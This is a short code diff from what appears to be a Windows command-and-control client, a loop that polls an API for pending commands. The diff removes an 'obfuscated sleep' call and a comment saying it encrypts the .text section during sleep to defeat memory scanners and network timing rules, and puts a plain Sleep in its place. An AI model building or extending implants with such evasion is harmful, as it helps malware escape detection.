@@ -353,10 +353,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 			std::vector<std::string> params;
 
 			while (true) {
-				// Jittered obfuscated sleep: encrypt .text section, sleep with ±33% jitter,
-				// decrypt on wake. Defeats memory scanners and timing-based network rules.
 				DWORD pollMs = (DWORD)atoi(s.client_delay);
-				SleepObfusc::ObfuscatedSleep(pollMs, pollMs / 3);
+				Sleep(pollMs);
 
 				last = api.GetPendingCommand();
 
